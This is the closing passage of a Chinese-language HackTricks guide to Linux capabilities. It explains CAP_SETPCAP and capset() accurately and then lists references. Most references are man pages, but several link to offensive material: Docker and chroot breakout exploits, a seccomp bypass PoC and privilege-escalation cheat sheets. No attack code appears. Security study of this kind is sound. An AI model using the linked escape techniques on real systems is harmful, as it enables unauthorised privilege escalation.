在支持文件 capabilities 的当前 Linux 内核中，**`CAP_SETPCAP`** 允许线程将其 bounding set 中的 capabilities 添加到其 inheritable set 中，从其 bounding set 中删除 capabilities，以及更改其 securebits。它不允许进程任意向另一个进程授予 capabilities；该行为仅适用于不支持 file-capability、早于 2.6.25 的内核。<sup>[[14]](#references)</sup>

`capset()` system call 可以调整线程自身的 effective、permitted 和 inheritable sets，但新的 permitted set 不能包含现有 permitted set 之外的 capabilities，且对 inheritable set 的更新仍受内核限制。<sup>[[14]](#references)</sup>

## References

- [1] [AttackDefense (Pentester Academy) - Linux capabilities privilege escalation labs](https://attackdefense.pentesteracademy.com)
- [2] [Hacker's Grimoire - Linux 权限提升](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Linux 容器基础：Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Linux capabilities 101](https://linux-audit.com/linux-capabilities-101/)
- [5] [利用 Linux Capabilities](https://www.linuxjournal.com/article/5737)
- [6] [过度的 Capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [滥用通过 /proc/pid/root 访问 mount namespaces 的权限](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
- [8] [Linux Capabilities：它们为何存在以及如何工作](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [理解 Linux 中的 Capabilities](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [允许 ptrace 时绕过 seccomp 的 PoC](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [如何突破各种 chroot 方案](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - Sebastian Krahmer 编写的原始 CAP_DAC_READ_SEARCH Docker breakout exploit](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Docker breakout exploit 分析](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
- [14] [capabilities(7) - Linux 手册页](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [15] [proc_pid_status(5) - Linux 手册页](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
- [16] [pam_cap(8) - Linux 手册页](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
- [17] [capability.conf(5) - Ubuntu 手册页](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
- [18] [systemd.exec(5) - Linux 手册页](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
- [19] [运行容器 - Docker 文档](https://docs.docker.com/engine/containers/run/)
- [20] [docker container run - Docker 文档](https://docs.docker.com/reference/cli/docker/container/run)
- [21] [cap_text_formats(7) - Linux 手册页](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
- [22] [getpcaps(8) - Linux 手册页](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
- [23] [getcap(8) - Linux 手册页](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [24] [amicontained](https://github.com/genuinetools/amicontained)
- [25] [setcap(8) - Linux 手册页](https://man7.org/linux/man-pages/man8/setcap.8.html)
- [26] [capsh(1) - Linux 手册页](https://man7.org/linux/man-pages/man1/capsh.1.html)
- [27] [ioctl_iflags(2) - Linux 手册页](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
{{#include ../../banners/hacktricks-training.md}}
